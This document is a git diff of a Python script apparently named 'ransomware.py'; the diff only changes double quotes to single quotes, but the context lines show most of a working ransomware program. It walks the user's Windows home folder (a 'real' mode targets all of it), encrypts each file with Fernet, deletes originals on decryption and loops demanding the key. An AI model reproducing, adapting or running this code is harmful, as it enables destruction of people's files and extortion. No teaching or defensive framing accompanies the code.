@@ -2,14 +2,14 @@ import base64
 import os
 import sys
 import subprocess
-subprocess.check_call([sys.executable, "-m", "pip", "install", "cryptography"])
+subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'cryptography'])
 
 from cryptography.fernet import Fernet, InvalidToken
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 
-#password_provided = "password"  # Password to use for generating the key
+#password_provided = 'password'  # Password to use for generating the key
 #password = password_provided.encode()  # Convert to type bytes
 #salt = b'\x87\x14p\x04z\x17]o\xfbA\x11-\xb4\xb2\xb1\xb9'
 #kdf = PBKDF2HMAC(
@@ -38,11 +38,11 @@ def generateKey():
 
 def encryptFiles(key):
     #Will set the path in os.walk to be C:\Users\{user} in the final version of the script
-    for root, dirs, files in os.walk("C:\\Users\\{user}{path}".format(path=path, user=os.getlogin())):
+    for root, dirs, files in os.walk('C:\\Users\\{user}{path}'.format(path=path, user=os.getlogin())):
         for file in files:
-            if(not (file == "key.key" or file == "ransomware.py" or ".encrypted" in file)):
+            if(not (file == 'key.key' or file == 'ransomware.py' or '.encrypted' in file)):
                 print(file)
-                encryptFile(root + "\\" + file, key)
+                encryptFile(root + '\\' + file, key)
 
 def encryptFile(filePath, key):
     try:
@@ -64,10 +64,10 @@ def encryptFile(filePath, key):
 def decryptFiles(key):
     decryptedFile = False
     #Will set the path in os.walk to be C:\Users\{user} in the final version of the script
-    for root, dirs, files in os.walk("C:\\Users\\{user}{path}".format(path=path, user=os.getlogin())):
+    for root, dirs, files in os.walk('C:\\Users\\{user}{path}'.format(path=path, user=os.getlogin())):
         for file in files:
             print(file)
-            decryptedFile = decryptFile(root + "\\" + file, key) or decryptedFile
+            decryptedFile = decryptFile(root + '\\' + file, key) or decryptedFile
     return decryptedFile
 
 #Returns True if the file at the given filePath is successfully decrypted, False if not
@@ -86,7 +86,7 @@ def decryptFile(filePath, key):
                 f.write(decrypted)
 
             #Remove the old encrypted file
-            if(".encrypted" in filePath):
+            if('.encrypted' in filePath):
                 os.remove(filePath)
 
             return True
@@ -95,20 +95,20 @@ def decryptFile(filePath, key):
     except Exception as e:
         return False
 
-path="aasdlhnjbacsldlaksdasc"
+path='aasdlhnjbacsldlaksdasc'
 
 if (len(sys.argv) == 1):
-    print("Not so fast, dumbass. Try an argument too.")
+    print('Not so fast, dumbass. Try an argument too.')
     quit()
-if (sys.argv[1] == "pretend"):
-    print("Oooh. Ooh yeah. I'm- I'm encryptin' real hard here. Ooh. I'm gonna morb")
+if (sys.argv[1] == 'pretend'):
+    print('Oooh. Ooh yeah. I\'m- I\'m encryptin\' real hard here. Ooh. I\'m gonna morb')
     quit()
-elif (sys.argv[1] == "practice"):
-    path="\\encrypt_test"
-elif (sys.argv[1] == "real"):
-    path=""
+elif (sys.argv[1] == 'practice'):
+    path='\\encrypt_test'
+elif (sys.argv[1] == 'real'):
+    path=''
 else:
-    print("Nice try, but I'm going to need a *real* argument next time.")
+    print('Nice try, but I\'m going to need a *real* argument next time.')
     quit()
 key = generateKey()
 encryptFiles(key)
@@ -116,8 +116,8 @@ encryptFiles(key)
 #Continue prompting the user for a key until the correct key is entered
 needKey = True
 while(needKey):
-    newKey = input("Enter key: ")
+    newKey = input('Enter key: ')
     needKey = not decryptFiles(newKey)
 
-print("Successfully decrypted files")
+print('Successfully decrypted files')
 
